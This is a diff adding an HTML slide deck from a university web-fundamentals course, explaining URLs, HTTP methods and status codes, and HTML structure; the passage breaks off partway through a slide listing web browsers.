@@ -1,0 +1,2107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Web Architecture &amp; Technologies</title>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+  <link rel="stylesheet" href="../_shared/styles/shower-ruben.css">
+  <link rel="stylesheet" href="../_shared/styles/web-fundamentals.css">
+</head>
+<body class="shower list">
+  <header class="caption">
+    <h1>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h1>
+    <p>
+      <a href="https://ruben.verborgh.org/">Ruben Verborgh</a>,
+      <a href="http://www.ugent.be/">Ghent University</a> – <a href="http://www.imec.be/">imec</a>
+    </p>
+    <ul class="links">
+      <li class="prev">Previous topic: <a href="../birds-eye-view/">A Bird’s-Eye View of the Web</a></li>
+      <li class="next">Next topic: <a href="../web-apis/">Web APIs</a></li>
+    </ul>
+  </header>
+
+  <div class="title slide" id="title">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+    <p class="author"><a href="https://ruben.verborgh.org/">Ruben Verborgh</a></p>
+    <p class="affiliation">
+      <a href="http://www.ugent.be/"><img  class="ugent"  src="../_shared/images/logos/ugent.svg"  alt="Ghent University"></a>
+      <a href="http://www.imec.be/"><img class="imec" src="../_shared/images/logos/imec.svg" alt="imec"></a>
+      <a href="http://idlab.ugent.be/"><img class="idlab" src="../_shared/images/logos/idlab.svg" alt="IDLab"></a>
+    </p>
+    <p class="license">
+      <a rel="license" href="https://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" src="../_shared/images/cc-by.svg" /></a>
+      Except where otherwise noted, the content of these slides is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </p>
+  </div>
+
+  <div class="slide" id="web-internet">
+    <h2>
+      The Web seems an “evident” extension<br>
+      of the Internet.
+    </h2>
+    <iframe class="image" src="../birds-eye-view/images/layers-internet.svg"></iframe>
+  </div>
+
+  <div class="slide" id="web-special">
+    <h2>
+      What is so special about<br>
+      the invention of the Web?
+    </h2>
+    <iframe class="image" src="../birds-eye-view/images/layers-web.svg"></iframe>
+  </div>
+
+  <div class="slide" id="flyer">
+    <h2>
+      This flyer predates the Web’s boom.<br>
+      <em>What is missing?</em>
+    </h2>
+    <a href="https://ruben.verborgh.org/phd/images/flyer.jpg"><img src="images/before-web.png" alt="[A flyer with instructions on how to obtain files through a mailserver and FTP server.]" height="580" class="narrow"></a>
+  </div>
+
+  <div class="slide" id="trinity">
+    <h2>
+      The Web actually consists of<br>
+      3 separate—but connected—inventions.
+    </h2>
+    <iframe class="next center image" src="images/trinity.svg" style="width: 440px"></iframe>
+  </div>
+
+  <div class="slide" id="url-http-html">
+    <h2>
+      The Web actually consists of<br>
+      3 separate—but connected—inventions.
+    </h2>
+    <ul>
+      <li>
+        A <a href="#core">URL</a> uniquely identifies a resource.
+        <ul><li><em>Uniform Resource Locator</em></li></ul>
+      </li>
+      <li><a href="#http">HTTP</a> allows us to retrieve a representation<br>
+        of a resource through a URL.
+        <ul><li><em>HyperText Transfer Protocol</em></li></ul>
+      </li>
+      <li>An <a href="#html">HTML</a> document can represent a resource,<br>
+        and link to other resources through their URL.
+        <ul><li><em>HyperText Markup Language</em></li></ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="index">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="toc slide" id="core">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li class="current">
+        <a href="#core">Core Web Standards</a>
+        <ul>
+          <li class="current"><a href="#core">URL</a></li>
+          <li><a href="#http">HTTP</a></li>
+          <li><a href="#html">HTML</a></li>
+        </ul>
+      </li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="identification-location">
+    <h2>
+      A Web URL uniquely <em>identifies</em> and <em>locates</em>
+      a resource anywhere in the universe.
+    </h2>
+    <ul>
+      <li class="next">
+        A string is a unique identifier if<br>
+        <em>at most one</em> entity corresponds to it.
+        <ul>
+          <li class="next">
+            A national number uniquely identifies a person,<br>
+            but does not allow locating him or her.
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        A string is a unique locator if<br>
+        <em>at most one</em> location corresponds to it.
+        <ul>
+          <li class="next">
+            A street address uniquely identifies a location,<br>
+            but does not allow to identify a specific person.
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="url-identification-location">
+    <h2>
+      A (well-chosen) URL <em>combines</em><br>
+      identification and location.
+    </h2>
+    <p><a href="http://en.wikipedia.org/wiki/Marissa_Mayer">http://en.wikipedia.org/wiki/Marissa_Mayer</a></p>
+    <ul>
+      <li class="next">
+        This URL <em>identifies</em> the current Wikipedia article
+        about Marissa Mayer.
+        <ul class="next">
+          <li>It does <em>not</em> (also) identify Marissa herself.</li>
+          <li>Otherwise, it wouldn’t be unique anymore.</li>
+        </ul>
+      </li>
+      <li class="next">
+        At the same time, this URL allows us to <em>locate</em>
+        the Wikipedia article about Marissa Mayer.
+        <ul class="next">
+          <li>Again, not Marissa herself—nor anything else.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="url-revolution">
+    <h2 class="opinion">
+      Deceptively simple, the URL is probably
+      the most revolutionary part of the Web.
+    </h2>
+    <ul>
+      <li class="next">
+        The <a href="#flyer">flyer</a> we saw earlier shows<br>
+        what a lack of unique location means.
+        <ul>
+          <li>publisher-specific download instructions</li>
+          <li>machine-dependent execution</li>
+        </ul>
+      </li>
+      <li class="next">
+        Unique identification partially existed,<br>
+        but not yet globally for documents.
+        <ul>
+          <li>e-mail address and server names are global</li>
+          <li>document names are server-specific</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="url-syntax">
+    <h2>
+      The generic URL syntax<br>
+      extends beyond the Web.
+    </h2>
+    <p><code>&lt;scheme&gt;:&lt;scheme-specific-part&gt;</code></p>
+    <ul>
+      <li>
+        different possible schemes
+        <ul class="inline">
+          <li><code>ftp</code></li>
+          <li><code>http</code></li>
+          <li><code>mailto</code></li>
+          <li><code>file</code></li>
+          <li>…</li>
+        </ul>
+      </li>
+      <li>
+        different scheme-specific parts
+        <ul>
+          <li><code>//&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;url-path&gt;</code></li>
+        </ul>
+      </li>
+      <li>
+        specified by the <a href="https://www.ietf.org/">Internet Engineering Task Force</a>
+        in <a href="https://tools.ietf.org/html/rfc1738">Request For Comments 1738</a>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="url-parts">
+    <h2>
+      The uniform structure of an HTTP URL<br>
+      includes the following parts.
+    </h2>
+    <p><code>http://&lt;host&gt;/&lt;path&gt;?&lt;search&gt;#&lt;fragment&gt;</code></p>
+    <dl>
+      <dt>hostname</dt>
+      <dd>identifies the machine</dd>
+      <dt>path</dt>
+      <dd>identifies the resource within the machine</dd>
+      <dt>search</dt>
+      <dd>optionally refines the resource</dd>
+      <dt>fragment</dt>
+      <dd>optionally identifies a part of the resource</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="url-parts-example">
+    <h2>
+      The uniform structure of an HTTP URL<br>
+      includes the following parts.
+    </h2>
+    <p><a href="http://en.wikipedia.org/wiki/Marissa_Mayer#Career">http://en.wikipedia.org/wiki/Marissa_Mayer#Career</a></p>
+    <dl>
+      <dt>hostname</dt>
+      <dd>the machine is <em>en.wikipedia.org</em></dd>
+      <dt>path</dt>
+      <dd>the resource is <em>/wiki/Marissa_Mayer</em></dd>
+      <dt>search</dt>
+      <dd><em>not present</em></dd>
+      <dt>fragment</dt>
+      <dd>the part of the resource is <em>Career</em></dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="url-instructions">
+    <h2>
+      An HTTP URL provides the instructions<br>
+      to obtain a representation of the resource.
+    </h2>
+    <p><code>http://&lt;host&gt;/&lt;path&gt;?&lt;search&gt;#&lt;fragment&gt;</code></p>
+    <ol>
+      <li class="next">
+        The client looks up the host’s IP address.
+        <ul>
+          <li>The client uses DNS for this.</li>
+        </ul>
+      </li>
+      <li class="next">
+        The client requests <code>/&lt;path&gt;?&lt;search&gt;</code>.
+        <ul>
+          <li>The server generates a response in a server-specific way.</li>
+        </ul>
+      </li>
+      <li class="next">
+        The client finds <code>#&lt;fragment&gt;</code>.
+        <ul>
+          <li>Fragments are defined by the representation format.</li>
+        </ul>
+      </li>
+    </ol>
+  </div>
+
+  <div class="slide" id="url-instructions-example">
+    <h2>
+      An HTTP URL provides the instructions<br>
+      to obtain a representation of the resource.
+    </h2>
+    <p><a href="http://en.wikipedia.org/wiki/Marissa_Mayer#Career">http://en.wikipedia.org/wiki/Marissa_Mayer#Career</a></p>
+    <ol>
+      <li>
+        The client looks up the IP address of <em>en.wikipedia.org</em>.
+        <ul>
+          <li>This address is <em>91.198.174.192</em>.</li>
+        </ul>
+      </li>
+      <li>
+        The client requests <em>/wiki/Marissa_Mayer</em>.
+        <ul>
+          <li>The server generates the corresponding Wikipedia article.</li>
+        </ul>
+      </li>
+      <li>
+        The client finds <em>#Career</em>.
+        <ul>
+          <li>This corresponds to a header in the HTML document.</li>
+        </ul>
+      </li>
+    </ol>
+  </div>
+
+  <div class="slide" id="url-family">
+    <h2>
+      The URL became part of a family<br>
+      of technologies related to identification.
+    </h2>
+    <ul>
+      <li class="next">
+        URL – Uniform Resource Locator (<a href="https://tools.ietf.org/html/rfc1738">RFC1738</a>)
+        <ul>
+          <li>unique identification and location of resources</li>
+          <li><em>mailto:ruben.verborgh@ugent.be</em></li>
+        </ul>
+      </li>
+      <li class="next">
+        URN – Uniform Resource Name (<a href="https://tools.ietf.org/html/rfc2141">RFC2141</a>)
+        <ul>
+          <li>location-independent resource identifier</li>
+          <li><em>urn:isbn:0-83891251-6</em></li>
+        </ul>
+      </li>
+      <li class="next">
+        URI – Uniform Resource Identifier (<a href="https://tools.ietf.org/html/rfc3986">RFC3986</a>)
+        <ul>
+          <li>union of URLs and URNs</li>
+        </ul>
+      </li>
+    </ul>
+    <footer>
+      <p>
+        “U” stands for “Uniform” rather than “Unique”,
+        since <em>identifiers</em> are presumed unique—not necessarily uniform.
+      </p>
+    </footer>
+  </div>
+
+  <div class="slide" id="iri">
+    <h2>
+      The broadest family is IRI,<br>
+      which supports non-ASCII characters.
+    </h2>
+    <ul>
+      <li>
+        Not all characters are allowed in a URI.
+        <ul>
+          <li>
+            <a href="https://tools.ietf.org/html/rfc3986#section-2.1">Percent-encode</a> non-ASCII chars.
+            <ul>
+              <li><em><code>é</code> becomes <code>%C3%A9</code></em></li>
+            </ul>
+          </li>
+          <li>
+            <a href="https://tools.ietf.org/html/rfc3986#section-2.1">Percent-encode</a> <a href="https://tools.ietf.org/html/rfc3986#section-2.2">chars with other meaning</a>.
+            <ul>
+              <li><em><code>?</code> becomes <code>%3F</code></em></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        IRI – Internationalized Resource Identifier (<a href="https://tools.ietf.org/html/rfc3987">RFC3987</a>)
+        <ul>
+          <li>Non-ASCII chars don’t need to be encoded.</li>
+          <li>Chars with other meaning still need encoding.</li>
+          <li class="next"><a href="http://🛀🌰🐊🎩🍓🐒🐝👊.🍕💩.ws">http://🛀🌰🐊🎩🍓🐒🐝👊.🍕💩.ws</a></li>
+        </ul>
+      </li>
+    </ul>
+    <footer>
+      <p>“URI” and “IRI” are typically used interchangeably.</p>
+    </footer>
+  </div>
+
+  <div class="toc slide" id="http">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li class="current">
+        <a href="#core">Core Web Standards</a>
+        <ul>
+          <li><a href="#core">URL</a></li>
+          <li class="current"><a href="#http">HTTP</a></li>
+          <li><a href="#html">HTML</a></li>
+        </ul>
+      </li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="http-overview">
+    <h2>
+      HTTP is a protocol to transfer representations
+      from a server to a client.
+    </h2>
+    <ul>
+      <li class="next">
+        HTTP standardizes how clients send a <em>request</em><br>
+        for a <a href="https://tools.ietf.org/html/rfc7231#section-3">representation</a>
+        of a <a href="https://tools.ietf.org/html/rfc7231#section-2">resource</a> through its URL.
+      </li>
+      <li class="next">
+        HTTP standardizes how servers reply with a <em>response</em>
+        that can contain a representation.
+      </li>
+      <li class="next">
+        The most widely used version is <a href="https://tools.ietf.org/html/rfc2616">HTTP 1.1</a>
+        (<a href="https://tools.ietf.org/html/rfc2616">RFC2616</a>).
+        <ul>
+          <li>
+            later split into
+            <ul class="inline">
+              <li><a href="https://tools.ietf.org/html/rfc7230">RFC7230</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7231">RFC7231</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7232">RFC7232</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7233">RFC7233</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7234">RFC7234</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7235">RFC7235</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-request">
+    <h2>
+      After resolving the server’s IP address,<br>
+      the client can send an HTTP request.
+    </h2>
+    <ul>
+      <li class="next">
+        The request starts with a <a href="https://tools.ietf.org/html/rfc7230#section-3.1.1">request line</a>.
+        <ul>
+          <li>
+            indicates
+            <ul class="inline">
+              <li><a href="https://tools.ietf.org/html/rfc7231#section-4">method</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-5.5">request URL path</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-2.6">HTTP version</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        The request can contain <a href="https://tools.ietf.org/html/rfc7231#section-5">header fields</a>.
+        <ul>
+          <li>
+            including
+            <ul class="inline">
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-5.4"><code>Host</code></a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7231#section-5.3.2"><code>Accept</code></a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7231#section-5.5.3"><code>User-Agent</code></a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        The request can optionally contain a <a href="https://tools.ietf.org/html/rfc7230#section-3.3">body</a>.
+        <ul>
+          <li>if the method allows it</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="example-request">
+    <h2>
+      After resolving the server’s IP address,<br>
+      the client can send an HTTP request.
+    </h2>
+    <p>
+      To obtain <a href="http://en.wikipedia.org/wiki/Marissa_Mayer">http://en.wikipedia.org/wiki/Marissa_Mayer</a>,
+      the client connects to 91.198.174.192 on TCP port 80,
+      and sends this request:
+    </p>
+    <pre><code><span class="next">GET /wiki/Marissa_Mayer HTTP/1.1</span>
+<span class="next">Host: en.wikipedia.org
+User-Agent: MyBrowser/1.0
+Accept: text/html</span></code></pre>
+  </div>
+
+  <div class="slide" id="http-methods">
+    <h2>
+      HTTP has a limited number of methods.<br>
+      The following 5 are widely known.
+    </h2>
+    <dl>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-4.3.1"><code>GET</code></a></dt>
+      <dd>transfer a representation</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-4.3.2"><code>HEAD</code></a></dt>
+      <dd>transfer only status and headers</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-4.3.3"><code>POST</code></a></dt>
+      <dd>perform a resource-specific operation</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-4.3.4"><code>PUT</code></a></dt>
+      <dd>replace all representations</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-4.3.5"><code>DELETE</code></a></dt>
+      <dd>remove all representations</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="safe-methods">
+    <h2>
+      An HTTP method is <a href="https://tools.ietf.org/html/rfc7231#section-4.2.1">safe</a><br>
+      if it is read-only.
+    </h2>
+    <ul>
+      <li class="next">
+        The client does not <em>request</em><br>
+        a state change of the resource.
+        <ul>
+          <li>The server can still change something,<br>
+              but the client is not “accountable”.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Safe methods include <code>GET</code> and <code>HEAD</code>.
+        <ul>
+          <li>Automated clients cannot cause harm with these.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Servers not respecting this contract act dangerously.
+        <ul>
+          <li>Example: <a href="https://ruben.verborgh.org/blog/2012/07/19/get-doesnt-change-the-world/">make people like a paper you wrote</a>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="idempotent-methods">
+    <h2>
+      An HTTP method is <a href="https://tools.ietf.org/html/rfc7231#section-4.2.2">idempotent</a><br>
+      if repetitions don’t alter the outcome.
+    </h2>
+    <ul>
+      <li class="next">
+        The client can execute an idempotent request<br>
+        1 or more times; the result remains the same.
+        <ul>
+          <li>If a request (maybe) failed, just try it again.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Idempotent methods include all safe methods,<br>
+        as well as <code>PUT</code> and <code>DELETE</code>.
+        <ul>
+          <li>Deleting something multiple times<br>
+              is the same as deleting it once.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Repeating other methods might be undesired.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="hostname">
+    <h2>
+      Clients send the hostname,<br>
+      <span class="next">so one server can host multiple websites.</span>
+    </h2>
+    <ul>
+      <li>
+        Although the client resolves it to an IP address,<br>
+        the hostname is still sent to the server.
+      </li>
+      <li class="next">
+        There is <em>no</em> one-to-one mapping<br>
+        between server IP addresses and domains.
+        <ul>
+          <li>
+            <em>One website</em> can be hosted by <em>multiple servers</em>.
+            <ul>
+              <li>Multiple DNS entries exist for a hostname.</li>
+            </ul>
+          </li>
+          <li>
+            <em>One server</em> can host <em>multiple websites</em>.
+            <ul>
+              <li>The <code>Host</code> header tells the server which one to pick.</li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="response">
+    <h2>
+      When a server receives a request,<br>
+      it generates a response.
+    </h2>
+    <ul>
+      <li class="next">
+        The response starts with a <a href="https://tools.ietf.org/html/rfc7230#section-3.1.2">status line</a>.
+        <ul>
+          <li>
+            indicates
+            <ul class="inline">
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-2.6">HTTP version</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7231#section-6">status code</a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-3.1.2">reason phrase</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        The response can contain <a href="https://tools.ietf.org/html/rfc7231#section-7">header fields</a>.
+        <ul>
+          <li>
+            including
+            <ul class="inline">
+              <li><a href="https://tools.ietf.org/html/rfc7231#section-3.1.1.5"><code>Content-Type</code></a></li>
+              <li><a href="https://tools.ietf.org/html/rfc7230#section-3.3.2"><code>Content-Length</code></a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li class="next">
+        The response can optionally contain a <a href="https://tools.ietf.org/html/rfc7230#section-3.3">body</a>.
+        <ul>
+          <li>depending on status code</li>
+          <li>contains the actual document contents</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="example-response">
+    <h2>
+      When a server receives a request,<br>
+      it generates a response.
+    </h2>
+    <p>
+      In response to our <a href="#example-request">previous request</a>:
+    </p>
+    <pre><code><span class="next">HTTP/1.1 200 OK</span>
+<span class="next">Date: Wed, 18 Feb 2016 09:30:46 GMT
+Content-Type: text/html; charset=UTF-8
+Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
+
+<span class="next">&lt;!DOCTYPE html&gt;
+&lt;html lang="en" dir="ltr" class="client-nojs"&gt;
+…</span></code></pre>
+  </div>
+
+  <div class="slide" id="status-codes">
+    <h2>
+      HTTP has 5 categories of status codes<br>
+      to indicate how the request was handled.
+    </h2>
+    <dl>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.2">100–199</a></dt>
+      <dd><em>info</em> – the client may continue</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.3">200–299</a></dt>
+      <dd><em>success</em> – request understood &amp; accepted</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.4">300–399</a></dt>
+      <dd><em>redirection</em> – further action is needed</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.5">400–499</a></dt>
+      <dd><em>client error</em> – the request cannot be fulfilled</dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.6">500–599</a></dt>
+      <dd><em>server error</em> – the server failed to fulfill</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="common-status-codes">
+    <h2>
+      A couple of these status codes<br>
+      are very commonly encountered.
+    </h2>
+    <dl>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.3.1">200</a></dt>
+      <dd class="next"><code>OK</code> <em>(“default”)</em></dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.4.2">301</a></dt>
+      <dd class="next"><code>Moved Permanently</code></dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.5.4">404</a></dt>
+      <dd class="next"><code>Not Found</code></dd>
+      <dt><a href="https://tools.ietf.org/html/rfc7231#section-6.6.1">500</a></dt>
+      <dd class="next"><code>Internal Server Error</code></dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="status-codes-summary">
+    <h2>
+      HTTP has 5 categories of status codes<br>
+      to indicate how the request was handled.
+    </h2>
+    <blockquote class="twitter-tweet">
+      <p>HTTP status ranges in a nutshell:&#10;&#10;1xx: hold on&#10;2xx: here you go&#10;3xx: go away&#10;4xx: you fucked up&#10;5xx: I fucked up</p>
+      <cite>Steve Losh</cite>
+      <a href="https://twitter.com/stevelosh/status/372740571749572610">August 28, 2013</a></blockquote>
+</div>
+
+  <div class="toc slide" id="html">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li class="current">
+        <a href="#core">Core Web Standards</a>
+        <ul>
+          <li><a href="#core">URL</a></li>
+          <li><a href="#http">HTTP</a></li>
+          <li class="current"><a href="#html">HTML</a></li>
+        </ul>
+      </li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="html5">
+    <h2>
+      <a href="https://www.w3.org/TR/html5/">HTML</a> is a markup language that<br>
+      captures the <em>structure</em> of documents.
+    </h2>
+    <ul>
+      <li>
+        HTML divides a document into <em>elements</em>,<br>
+        which are indicated by opening and closing <em>tags</em>.
+        <ul>
+          <li>Tags begin with “<code>&lt;</code>” and end with “<code>&gt;</code>”.</li>
+          <li>(Regular) closing tags begin with “<code>&lt;/</code>”.</li>
+          <li>Self-closing tags end with “<code>/&gt;</code>”.</li>
+        </ul>
+      </li>
+      <li>
+        Opening tags can have key/value attributes.
+        <ul>
+          <li>The key name is followed by “<code>=</code>” and its value.</li>
+          <li>The value is usually surrounded by (single/double) quotes.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="tags-attributes">
+    <h2>
+      An element consists of its tags, attributes,
+      and child nodes (elements and/or text).
+    </h2>
+    <p>This is a fragment of an HTML document.</p>
+    <pre><code class="element"><span class="tag">&lt;main&gt;</span>
+  <span class="element"><span class="tag">&lt;h1&gt;</span>This is a title.<span class="tag">&lt;&#47;h1&gt;</span></span>
+  <span class="element"><span class="tag">&lt;p id&#61;&#34;introduction&#34; class&#61;&#34;summary&#34;&gt;</span>
+    This is a&#160;paragraph<span class="element"><span class="tag">&lt;br/&gt;</span></span>
+    with <span class="element"><span class="tag">&lt;em&gt;</span>emphasized<span class="tag">&lt;&#47;em&gt;</span></span> words.
+  <span class="tag">&lt;&#47;p&gt;</span></span>
+  <span class="element"><span class="tag">&lt;img src="image.jpg" alt="an image" /&gt;</span></span>
+<span class="tag">&lt;&#47;main&gt;</span></code></pre>
+  </div>
+
+  <div class="slide" id="html-schema">
+    <h2>
+      The HTML specification restricts<br>
+      what elements can be used and where.
+    </h2>
+    <ul>
+      <li>
+        <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element">A few dozen tags</a>
+        exist for different element types.
+      </li>
+      <li>
+        They have rules for what attributes they can have,
+        and what child elements they can/should have.
+      </li>
+      <li>
+        There are three main parts:
+        <ul>
+          <li><code>&lt;html&gt;</code> for the entire document</li>
+          <li><code>&lt;head&gt;</code> for document metadata</li>
+          <li><code>&lt;body&gt;</code> for document contents</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="hypermedia-controls">
+    <h2>
+      HTML documents can contain hyperlinks<br>
+      and other <em>hypermedia controls</em>.
+    </h2>
+    <ul>
+      <li class="next">
+        The <code>&lt;a&gt;</code> tag starts a link toward another resource.
+        <ul>
+          <li><code>&lt;a href="http://perdu.com/"&gt;Lost?&lt;/a&gt;</code></li>
+          <li>results in the link “<a href="http://perdu.com/">Lost?</a>”</li>
+        </ul>
+      </li>
+      <li class="next">
+        A <code>&lt;form&gt;</code> element creates requests
+        from user input.
+        <form action="https://www.google.com/search">
+          <ul>
+            <li>
+              <label for="google-keywords">Keywords</label>
+              <input type="text" id="google-keywords" name="q" value="HTML5 specification" />
+            </li>
+          </ul>
+          <p><input type="submit" value="Search on Google" /></p>
+        </form>
+      </li>
+      <li class="next">
+        This results in an URL for a resource,
+        whose representation can be retrieved through HTTP.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="embed">
+    <h2>
+      HTML documents can embed or use<br>
+      other media documents.
+    </h2>
+    <ul>
+      <li>
+        Embed images, audio, and video.
+        <ul class="inline">
+          <li><code>&lt;img&gt;</code></li>
+          <li><code>&lt;audio&gt;</code></li>
+          <li><code>&lt;video&gt;</code></li>
+        </ul>
+      </li>
+      <li>
+        Use <a href="#css">style sheets</a>, <a href="#web-fonts">fonts</a>,
+        and <a href="#javascript">scripts</a>.
+        <ul class="inline">
+          <li><code>&lt;link rel="stylesheet"&gt;</code></li>
+          <li><code>&lt;script&gt;</code></li>
+        </ul>
+      </li>
+      <li>
+        Embed other pages (instead of linking to them).
+        <ul class="inline">
+          <li><code>&lt;iframe&gt;</code></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="markup-not-makeup">
+    <h2>
+      HTML is intended for <em>markup</em>,<br>
+      not for <em>makeup</em>.
+    </h2>
+    <ul>
+      <li>
+        HTML elements focus on structure…
+        <ul>
+          <li><code>&lt;h2&gt;The &lt;em&gt;new&lt;/em&gt; section&lt;/h2&gt;</code></li>
+        </ul>
+      </li>
+      <li>
+        …not on aesthetics.
+        <ul>
+          <li>
+            <code>&lt;font size="5"&gt;<br>
+                  &lt;b&gt;The &lt;i&gt;new&lt;/i&gt; section&lt;/b&gt;<br>
+                  &lt;/font&gt;&lt;br/&gt;</code>
+          </li>
+        </ul>
+      </li>
+      <li>
+        <em>Makeup</em>-only elements were removed from HTML5.
+      </li>
+    </ul>
+  </div>
+
+  <div class="toc slide" id="architecture">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li class="current">
+        <a href="#architecture">Web Architecture</a>
+        <ul>
+          <li class="current"><a href="#architecture">Clients</a></li>
+          <li><a href="#servers">Servers</a></li>
+          <li><a href="#intermediaries">Intermediaries</a></li>
+        </ul>
+      </li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2018">#WebDev2018</a></p>
+  </div>
+
+  <div class="slide" id="client-variety">
+    <h2>
+      The Web supports an immense variety<br>
+      of different clients.
+    </h2>
+    <ul>
+      <li>
+        <a href="#browsers">interactive (graphical) browsers</a>
+        <ul class="inline">
+          <li><a href="https://www.mozilla.org/firefox/products/">Firefox</a></li>
+          <li><a href="https://www.google.com/chrome/">Chrome</a></li>
+          <li><a href="http://windows.microsoft.com/internet-explorer">Internet Explorer</a></li>
